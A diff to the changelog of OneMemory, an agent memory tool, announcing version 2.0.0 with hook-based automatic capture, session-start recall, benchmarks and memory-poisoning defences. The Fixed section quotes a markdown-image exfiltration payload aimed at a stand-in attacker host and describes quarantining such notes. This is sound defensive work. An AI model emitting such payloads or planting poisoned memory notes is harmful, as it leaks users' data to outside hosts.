@@ -4,9 +4,33 @@ All notable changes to this project are documented here. The format is based on
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project aims
 to follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
-## [Unreleased]
+## [2.0.0] - 2026-10-31
+
+OneMemory now remembers on its own: it records what your agent does, distills it into short typed notes, and brings the
+right ones back at the start of the next session — with no model call unless you turn one on, nothing leaving your
+computer, and every memory sourced, versioned and undoable. It installs into eight AI tools, imports from claude-mem,
+mem0 and basic-memory, and publishes its retrieval numbers (LongMemEval-S, LoCoMo) with the scripts to reproduce them.
+
+**Upgrading:** the database moves to schema v16 on first open (a backup is copied next to it first, as before). Older
+OneMemory versions cannot open a v16 database, so upgrade every machine that shares one. Nothing is captured until you
+run `onememory setup --capture` and say yes.
 
 ### Added
+- **Automatic memory (opt-in).** `onememory setup --capture` wires Claude Code's hooks (and Codex, Gemini CLI, Muse) to
+  `onememory hook <event>`. Each tool event is redacted (`<private>…</private>` stripped, secrets masked) and kept briefly;
+  at session end it is distilled, without a model, into typed observations (files changed, commits, test runs, fail-to-pass
+  bugfixes, decisions, security notes) and one session summary. The hook never blocks your agent: it fails open and always exits 0.
+- **Session-start context.** A ranked pack of what matters for this branch, these files and your recent work, inside a
+  token budget (`ONEMEMORY_RECALL_TOKENS`, default 1500), behind an untrusted-data banner, with a savings footer.
+- **Progressive disclosure tools:** `memory_index` (one line per memory with its token cost), `memory_timeline`, `memory_get`
+  and `session_list` over MCP, and `/index`, `/timeline`, `/get`, `/sessions` over REST — look first, then fetch only what you need.
+- **File context on Read:** before your agent reads a file, it is told what memory knows about that file (advisory; it never blocks the read).
+- **Dashboard Sessions tab** with a timeline per session.
+- **Optional local summary:** `ONEMEMORY_LLM_URL` + `ONEMEMORY_LLM_MODEL` let a local model (Ollama, LM Studio) rewrite each
+  session summary in one call at session end. Off by default; loopback only unless you allow otherwise.
+- **`ONEMEMORY_EMBEDDINGS=auto`:** semantic search when the local embedding endpoint answers, silently keyword-only when not.
+- **Retrieval benchmark:** `onememory bench --longmemeval` and `--locomo` download the public datasets once and score retrieval
+  (recall@k, nDCG, MRR, latency) with no model and no judge. Results and caveats: [docs/BENCHMARK.md](./docs/BENCHMARK.md).
 - **Decay for captured rows.** Observations nobody updated or read for `ONEMEMORY_DECAY_DAYS` (30) and session summaries idle
   `ONEMEMORY_DECAY_SUMMARY_DAYS` (180) are archived, never deleted, by the existing expiry sweep and at session end. Ordinary notes,
   decisions and rows tagged `pinned` never decay; `0` turns it off. `onememory decay [--dry-run]` previews or runs it now; `onememory
@@ -22,8 +46,8 @@ to follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   trusted fact; secrets are redacted on capture and blocked on write; a forged writer or namespace is stamped with the real one; an
   unsigned import cannot pose as verified; a captured web fetch is not promoted to trusted memory; the SessionStart injection carries
   the untrusted-data banner and leaves distrusted notes out; and mass near-duplicate flooding cannot bury the real answer. Headline
-  `poison-reach-count` must be 0. It added two bench ops (`capture`, `session_start`) to the runner. One open gap it found:
-  `GAP-POISON-MDLINK` (markdown image/link data-exfiltration payloads are not flagged).
+  `poison-reach-count` must be 0. It added two bench ops (`capture`, `session_start`) to the runner. The one gap it found,
+  `GAP-POISON-MDLINK`, is fixed (see Fixed).
 
 ### Changed
 - **Captured prompts and tool inputs are now encrypted at rest** when encryption is on, the same way tool outputs already were. Turning
@@ -72,6 +96,14 @@ to follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 - Capture spool: an event that keeps failing to store is dropped after 5 drains instead of cycling forever, and a
   `.draining` file left by a killed hook is drained later instead of staying on disk.
 - `onememory watch` stops with an error after 10 failures in a row instead of retrying every 5 s forever.
+- **`state_search` answers whole questions.** Keyword search needed every word to match, so a question such as "which
+  region do we deploy production to?" found almost nothing (LongMemEval-S recall@5 11.9%). When the all-words search
+  leaves room, it now adds notes matching some of the words, always ranked below full matches (recall@5 95%).
+- **Writes stay fast as memory grows.** Each write stored a similarity link to every close note, about 430 per captured
+  observation, so writes took ~100 ms and the database reached 111 MB at 3,000 notes. At most 32 are kept (reads use 10):
+  3.8 ms and 18 MB.
+- **Markdown image exfiltration is held** (`GAP-POISON-MDLINK`): a note with a remote markdown image carrying a query
+  string (`![x](https://attacker/p?data=...)`), which loads by itself when rendered, goes to quarantine. Badge hosts are exempt.
 
 ## [1.7.2] - 2026-10-25
 
